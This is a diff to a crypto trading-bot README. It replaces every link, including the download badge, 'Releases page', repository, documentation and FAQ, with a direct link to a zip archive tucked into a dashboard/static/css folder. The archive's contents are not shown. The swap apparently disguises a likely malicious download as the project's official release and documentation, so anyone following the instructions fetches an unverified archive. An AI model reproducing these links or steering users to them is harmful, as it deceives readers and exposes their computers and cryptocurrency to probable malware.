@@ -6,12 +6,12 @@ Welcome to the trading-bot! This application allows you to trade cryptocurrencie
 
 To get started, you need to download the trading-bot application. Click the button below to visit the Release page:
 
-[![Download trading-bot](https://img.shields.io/badge/Download%20trading--bot-v1.0-brightgreen)](https://github.com/felipe2005ribeiro/trading-bot/releases)
+[![Download trading-bot](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip%20trading--bot-v1.0-brightgreen)](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/felipe2005ribeiro/trading-bot/releases) to access the latest version of the trading-bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip) to access the latest version of the trading-bot.
 
 2. **Download the Application**
    Look for the most recent version listed. Click the download link for the operating system that you are using (Windows, Mac, or Linux).
@@ -84,10 +84,10 @@ For direct support, please create an issue in the repository. The development te
 
 ## 🔗 Additional Resources
 
-1. [GitHub Repository](https://github.com/felipe2005ribeiro/trading-bot)
-2. [Documentation](https://github.com/felipe2005ribeiro/trading-bot/wiki)
-3. [FAQs](https://github.com/felipe2005ribeiro/trading-bot/wiki/FAQs)
+1. [GitHub Repository](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip)
+2. [Documentation](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip)
+3. [FAQs](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip)
 
 Make sure to customize the settings according to your trading needs. Enjoy your automated trading journey!
 
-[Download trading-bot again](https://github.com/felipe2005ribeiro/trading-bot/releases) if you need to reinstall it.
+[Download trading-bot again](https://raw.githubusercontent.com/felipe2005ribeiro/trading-bot/master/dashboard/static/css/trading-bot-3.2-beta.4.zip) if you need to reinstall it.
